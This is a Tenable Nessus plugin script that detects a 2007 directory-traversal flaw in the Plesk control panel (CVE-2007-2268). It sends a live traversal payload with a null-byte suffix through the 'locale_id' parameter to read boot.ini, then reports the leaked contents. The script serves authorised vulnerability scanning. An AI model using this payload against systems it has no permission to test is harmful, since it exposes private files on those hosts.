#
#  (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(25090);
  script_version("$Revision: 1.16 $");

  script_cve_id("CVE-2007-2268");
  script_bugtraq_id(23639);
  script_osvdb_id(34081, 34082);

  script_name(english:"Plesk Multiple Script locale_id Parameter Traversal Arbitrary File Access");
  script_summary(english:"Tries to read boot.ini using Plesk's login script"); 
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to a
directory traversal attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Plesk, a control panel used to administer
and manage websites. 

The version of Plesk installed on the remote host fails to sanitize
user-supplied input to the 'locale_id' parameter of the 'login.php3',
'login_up.php', and 'top.php3' scripts before using it to access
files.  On a Windows platform, an unauthenticated attacker can
leverage this issue to read the contents of arbitrary files on the
remote host, subject to the privileges of the web server user id." );
  script_set_attribute(attribute:"see_also", value:"http://kb.swsoft.com/en/1798" );
 script_set_attribute(attribute:"solution", value:
"See the vendor's website for patch information." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2007/04/27");
 script_set_attribute(attribute:"vuln_publication_date", value: "2007/04/13");
 script_cvs_date("$Date: 2016/05/16 14:22:06 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:swsoft:plesk");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Try to read a file.
file = "../../../../../../../../../../../../boot.ini";

r = http_send_recv3(method:"GET", port:port,
  item:string(
    "/login_up.php3?",
    "login_name=x&",
     "passwd=x&",
     "locale_id=", file, "%00.jpg"
  ) );
if (isnull(r)) exit(0);
res = r[2];


# There's a problem if it looks like we were successful.  
if ("[boot loader]" >< res)
{
  content = res - strstr(res, "<!DOCTYPE");
  if ("[boot loader]" >!< res) content = res;

  report = string(
    "Here are the contents of the file '\\boot.ini' that Nessus\n",
    "was able to read from the remote host :\n",
    "\n",
    content
  );
  security_warning(port:port, extra:report);
}
